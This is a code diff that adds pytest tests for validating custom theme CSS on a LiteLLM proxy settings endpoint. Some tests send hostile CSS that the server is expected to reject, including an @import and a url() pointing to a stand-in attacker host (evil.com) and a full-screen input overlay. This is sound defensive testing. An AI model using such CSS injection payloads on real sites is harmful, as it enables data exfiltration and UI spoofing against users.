@@ -1315,6 +1315,76 @@ class TestProxySettingEndpoints:
         assert values["logo_url"] is None
         assert values["favicon_url"] is None
 
+    def test_update_ui_theme_settings_accepts_valid_custom_css(self, mock_proxy_config, mock_auth, monkeypatch):
+        monkeypatch.setenv("LITELLM_SALT_KEY", "test_salt_key")
+        monkeypatch.setattr("litellm.proxy.proxy_server.store_model_in_db", True)
+
+        response = client.patch(
+            "/update/ui_theme_settings",
+            json={"custom_theme_css": ":root { --background: #1a1a2e; --primary: #e94560; }\n.dark { --background: #0f0f1a; }"},
+        )
+        assert response.status_code == 200
+
+    def test_update_ui_theme_settings_rejects_at_rule_in_css(self, mock_proxy_config, mock_auth, monkeypatch):
+        monkeypatch.setenv("LITELLM_SALT_KEY", "test_salt_key")
+        monkeypatch.setattr("litellm.proxy.proxy_server.store_model_in_db", True)
+
+        response = client.patch(
+            "/update/ui_theme_settings",
+            json={"custom_theme_css": ":root { --background: #000; }\n@import url(http://evil.com/steal.css);"},
+        )
+        assert response.status_code == 422
+
+    def test_update_ui_theme_settings_rejects_url_in_css(self, mock_proxy_config, mock_auth, monkeypatch):
+        monkeypatch.setenv("LITELLM_SALT_KEY", "test_salt_key")
+        monkeypatch.setattr("litellm.proxy.proxy_server.store_model_in_db", True)
+
+        response = client.patch(
+            "/update/ui_theme_settings",
+            json={"custom_theme_css": ":root { --background: url(http://evil.com/x.png); }"},
+        )
+        assert response.status_code == 422
+
+    def test_update_ui_theme_settings_rejects_non_root_selector(self, mock_proxy_config, mock_auth, monkeypatch):
+        monkeypatch.setenv("LITELLM_SALT_KEY", "test_salt_key")
+        monkeypatch.setattr("litellm.proxy.proxy_server.store_model_in_db", True)
+
+        response = client.patch(
+            "/update/ui_theme_settings",
+            json={"custom_theme_css": "input { position: fixed; top: 0; width: 100%; }"},
+        )
+        assert response.status_code == 422
+
+    def test_update_ui_theme_settings_rejects_non_custom_property(self, mock_proxy_config, mock_auth, monkeypatch):
+        monkeypatch.setenv("LITELLM_SALT_KEY", "test_salt_key")
+        monkeypatch.setattr("litellm.proxy.proxy_server.store_model_in_db", True)
+
+        response = client.patch(
+            "/update/ui_theme_settings",
+            json={"custom_theme_css": ":root { background: red; }"},
+        )
+        assert response.status_code == 422
+
+    def test_update_ui_theme_settings_rejects_unknown_variable(self, mock_proxy_config, mock_auth, monkeypatch):
+        monkeypatch.setenv("LITELLM_SALT_KEY", "test_salt_key")
+        monkeypatch.setattr("litellm.proxy.proxy_server.store_model_in_db", True)
+
+        response = client.patch(
+            "/update/ui_theme_settings",
+            json={"custom_theme_css": ":root { --evil-injection: #000; }"},
+        )
+        assert response.status_code == 422
+
+    def test_update_ui_theme_settings_accepts_none_custom_css(self, mock_proxy_config, mock_auth, monkeypatch):
+        monkeypatch.setenv("LITELLM_SALT_KEY", "test_salt_key")
+        monkeypatch.setattr("litellm.proxy.proxy_server.store_model_in_db", True)
+
+        response = client.patch(
+            "/update/ui_theme_settings",
+            json={"custom_theme_css": None},
+        )
+        assert response.status_code == 200
+
     def test_get_ui_settings(self, mock_auth, monkeypatch):
         """Test retrieving UI settings with allowlist sanitization"""
         from unittest.mock import AsyncMock, MagicMock
